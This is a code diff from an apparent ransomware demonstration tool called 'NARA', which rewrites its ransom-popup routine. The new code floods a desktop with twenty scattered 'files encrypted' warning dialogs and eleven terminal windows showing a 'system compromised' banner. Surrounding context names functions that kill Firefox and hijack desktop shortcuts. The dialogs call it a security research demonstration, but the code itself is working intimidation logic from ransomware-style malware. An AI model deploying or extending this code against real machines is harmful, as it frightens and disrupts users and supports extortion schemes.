@@ -656,29 +656,122 @@ def kill_firefox():
         print(f"[RANSOMWARE] Firefox kill skipped: {e}")
 
 
-def show_ransom_popups(count: int = 10):
-    """Sequential modal dialogs (demo annoyance). Requires zenity on DISPLAY."""
+def _write_banner_script() -> str:
+    """Write a dramatic display script for terminal windows to execute."""
+    script_path = "/tmp/nara_banner.sh"
+    script = (
+        "#!/bin/bash\n"
+        "clear\n"
+        'echo -e "\\033[1;31m"\n'
+        "cat << 'BANNER'\n"
+        "\n"
+        "  ╔═══════════════════════════════════════════════════════════╗\n"
+        "  ║                                                           ║\n"
+        "  ║   ███╗   ██╗ █████╗ ██████╗  █████╗                      ║\n"
+        "  ║   ████╗  ██║██╔══██╗██╔══██╗██╔══██╗                     ║\n"
+        "  ║   ██╔██╗ ██║███████║██████╔╝███████║                     ║\n"
+        "  ║   ██║╚██╗██║██╔══██║██╔══██╗██╔══██║                     ║\n"
+        "  ║   ██║ ╚████║██║  ██║██║  ██║██║  ██║                     ║\n"
+        "  ║   ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                     ║\n"
+        "  ║                                                           ║\n"
+        "  ║         YOUR SYSTEM HAS BEEN COMPROMISED                  ║\n"
+        "  ║         ALL FILES HAVE BEEN ENCRYPTED                     ║\n"
+        "  ║                                                           ║\n"
+        "  ╚═══════════════════════════════════════════════════════════╝\n"
+        "\n"
+        "BANNER\n"
+        'echo -e "\\033[0m"\n'
+        f"cat {NOTE_FOR_LAUNCHERS} 2>/dev/null\n"
+        'echo -e "\\033[31m"\n'
+        "sleep 600\n"
+    )
+    with open(script_path, "w") as f:
+        f.write(script)
+    os.chmod(script_path, 0o755)
+    return script_path
+
+
+def show_ransom_popups(count: int = 20):
+    """Scatter ransom dialogs + terminal windows at random positions across the VNC desktop."""
+    import random as _rng
+    import time as _time
+
     env = os.environ.copy()
     env.setdefault("DISPLAY", ":1")
+
+    # Screen bounds (VNC resolution) minus window size to keep them on-screen
+    SCR_W, SCR_H = 1920, 1080
+
+    # ── Wave 1: Zenity dialogs at random positions via xdotool ────────
+    spawned = 0
     for i in range(count):
         try:
-            subprocess.run(
+            subprocess.Popen(
                 [
                     "zenity",
                     "--warning",
                     "--title=RANSOMWARE",
-                    "--text=RANSOMWARE",
+                    "--text="
+                    "YOUR FILES HAVE BEEN ENCRYPTED\n\n"
+                    "All documents, photos, and databases\n"
+                    "have been locked by NARA.\n\n"
+                    "This is a security research demonstration.",
                     "--no-wrap",
-                    "--width=320",
+                    "--width=400",
                 ],
                 env=env,
-                timeout=600,
-                capture_output=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
             )
-        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
-            print(f"[RANSOMWARE] Popup {i + 1}/{count} skipped: {e}")
+            spawned += 1
+        except (FileNotFoundError, OSError):
             break
-    print(f"[RANSOMWARE] Showed {count} RANSOMWARE dialog(s) (zenity)")
+
+    # Scatter the zenity windows that just spawned (if xdotool is available)
+    _time.sleep(0.5)  # let windows appear
+    try:
+        subprocess.Popen(
+            ["bash", "-c",
+             "for wid in $(xdotool search --name RANSOMWARE 2>/dev/null); do "
+             f"  xdotool windowmove $wid $(shuf -i 0-{SCR_W - 420} -n1) $(shuf -i 0-{SCR_H - 250} -n1) 2>/dev/null; "
+             "done"],
+            env=env,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+    except (FileNotFoundError, OSError):
+        pass  # xdotool not installed — zenity windows just cascade normally
+
+    # ── Wave 2: Terminal windows scattered randomly ───────────────────
+    banner_script = _write_banner_script()
+    # Varying sizes for a chaotic look
+    sizes = ["70x18", "85x22", "60x15", "75x20", "90x24", "65x16", "80x20",
+             "70x18", "85x22", "60x15", "75x20"]
+    term_count = 0
+    for i in range(len(sizes)):
+        cols_rows = sizes[i]
+        x = _rng.randint(0, SCR_W - 600)
+        y = _rng.randint(0, SCR_H - 350)
+        geom = f"{cols_rows}+{x}+{y}"
+        try:
+            subprocess.Popen(
+                [
+                    "xfce4-terminal",
+                    f"--geometry={geom}",
+                    "--title=SYSTEM COMPROMISED",
+                    "--hide-menubar",
+                    "-e", f"bash {banner_script}",
+                ],
+                env=env,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            term_count += 1
+            _time.sleep(0.08)  # stagger slightly so they visibly pop in one by one
+        except (FileNotFoundError, OSError):
+            break
+
+    print(f"[RANSOMWARE] Scattered across desktop: {spawned} dialog(s) + {term_count} terminal banner(s)")
 
 
 def hijack_desktop_shortcuts():
